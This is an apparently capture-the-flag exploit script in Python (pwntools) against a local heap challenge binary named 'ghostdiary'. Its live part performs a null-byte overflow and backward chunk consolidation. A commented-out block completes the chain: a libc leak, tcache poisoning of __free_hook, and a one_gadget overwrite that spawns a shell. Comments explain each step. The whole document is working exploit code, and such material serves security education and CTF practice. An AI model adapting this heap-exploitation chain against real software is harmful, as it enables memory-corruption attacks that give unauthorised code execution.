#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

elf = ELF('./ghostdiary')
p = process('./ghostdiary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Credits to teamrocketist for the following two functions, they help immensely when trying
# to debug exploits
def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
  script = ""
  PIE = get_base_address(p)
  for bp in breakpoints:
    script += "b *0x%x\n"%(PIE+bp)
  gdb.attach(p,gdbscript=script)

# Application logic functions
def add(size):
  p.sendlineafter('> ', '1')

  if size <= 0xf0:
    p.sendlineafter('> ', '1')
  else:
    p.sendlineafter('> ', '2')

  p.sendlineafter(': ', str(size))

def talk(page, content):
  p.sendlineafter('> ', '2')
  p.sendlineafter(': ', str(page))
  p.sendafter(': ', str(content))

def listen(page):
  p.sendlineafter('> ', '3')
  p.sendlineafter(': ', str(page))
  content = p.recvline().split(': ')[1].strip('\n')
  return content

def free(page):
  p.sendlineafter('> ', '4')
  p.sendlineafter(': ', str(page))

if args.GDB:
  debug([0x1024])

# Exploit goes here

# Setup
add(0x128) # A, idx 0
add(0x118) # B, idx 1
add(0x118) # C, idx 2

# Fill up tcache bin 0xf0
# Done because the NULL byte overflow will unset the PREV_INUSE bit of the next chunk
# Meaning that it will change the next chunks size to 0x100
# 0x100 chunks go into the 0xf0 tcache bin
# We prevent this since we want backwards consolidation to occur
# This will be evident further below
for i in range(7):
  add(0xf0)
for i in range(7):
  free(i+3)

# Fill up tcache bin 0x128
# We do this because of the same reason above
for i in range(7):
  add(0x128)
for i in range(7):
  free(i+3)

# Make chunk A go into unsorted bin
# This is important because we are consolidating chunk C back with both chunks A and B
# Meaning that unlink will be called with chunk A as it's second argument
# unlink has some security checks, one being that A's fd and bk must have valid pointers
# This free will put the pointers to `main_arena+0x58` into the fd and bk of A
free(0)

# Null byte overflow onto chunk C.
# C's size is now 0x100.
# C's prev_size is also set to 0x250
talk(1, 'B'*0x110 + p64(0x250))

# Before we free chunk C, we must create a fake chunk 0x100 bytes after chunk C
# This fake chunk must have its PREV_INUSE bit set to 1, hence we choose size 0x21
# This is required to bypass some checks when a chunk is freed into the unsorted bin
talk(2, 'C'*0xf8 + p64(0x21) + '\n')

raw_input('debugging')
# We free C now.
# C's prev_size is 0x250, so it will consolidate backwards 0x250 bytes (all the way up to A)
# Unsorted bin will now have a 0x350 sized chunk right on top of A
# A's fd and bk pointers will still have pointers to `main_arena+0x58`
free(2)
'''
# Empty the 0x128 tcache bin so we can get chunks out of the unsorted bin
# Indexes taken up: 0, 2, 3, 4, 5, 6, 7
for i in range(7):
  add(0x128)

# Now adding a chunk of size 0x128 gives us a chunk from the unsorted bin
# In this case, unsorted bin will have a 0x350 sized chunk on chunk A
# We first add a 0x128 sized chunk so that the libc address gets moved down to chunk B
# This happens because now the unsorted bin will have a chunk starting at chunk B
add(0x128) # idx 8

# Now since we have a pointer to chunk B, we can leak the the fd pointer
# Remember the fd pointer just points to `main_arena+0x58`
libc_leak = u64(listen(1).ljust(8, '\x00'))

# Calculate needed offsets
libc.address = libc_leak - 0x3ebca0
one_gadget = libc.address + 0x4f322
free_hook = libc.symbols['__free_hook']

log.info('main arena leak: ' + hex(libc_leak))
log.info('Libc base: ' + hex(libc.address))
log.info('one gadget: ' + hex(one_gadget))
log.info('free_hook: ' + hex(free_hook))

# Fill up the 0x128 tcache bin again
# We do this to make subsequent mallocs easier to use
# It is easier to visualise the indexes in my opinion
# Indexes freed: 0, 2, 3, 4, 5, 6, 7
free(0)
for i in range(2, 8):
  free(i)

# Add overlapped chunk with B with size 0x1d8, this creates a new tcache bin when freed
# The new tcache bin is used for the tcache poisoning attack
# Otherwise there are some checks to bypass if we do an fastbin attack (for example)
# It's just easier to do it with the tcache bins
add(0x1d8) # idx 0, overlapped with the starting chunk B

# At this point, the two overlapped chunks are at indexes 0 and 1
# Double free them and put them into tcache bin 0x1d8
free(0)
free(1)

# Add one of them, change its fd to __free_hook
add(0x1d8) # idx 0
talk(0, p64(free_hook) + '\n')

# Two more chunks and we get a chunk on __free_hook
add(0x1d8) # 1, overlapped chunk with chunk B again
add(0x1d8) # 2, chunk on __free_hook

# Overwrite __free_hook with one_gadget
talk(2, p64(one_gadget) + '\n')

# Trigger __free_hook which gives us shell
free(1)
'''
p.interactive()


